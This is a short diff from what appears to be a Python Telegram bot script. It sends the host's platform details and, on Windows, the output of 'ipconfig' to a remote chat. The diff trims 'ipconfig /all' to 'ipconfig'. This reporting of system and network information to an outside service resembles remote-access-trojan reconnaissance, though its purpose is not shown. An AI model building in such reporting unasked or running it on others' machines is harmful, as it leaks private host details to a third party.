@@ -32,7 +32,7 @@ bot.sendMessage(chat_id,platform.uname())
 
 if(platform.system() == "Windows"):
     import subprocess
-    proc = subprocess.check_output("ipconfig /all").decode('utf-8')
+    proc = subprocess.check_output("ipconfig").decode('utf-8')
     bot.sendMessage(chat_id,proc)
 if(platform.system() == "Linux"):
     import subprocess
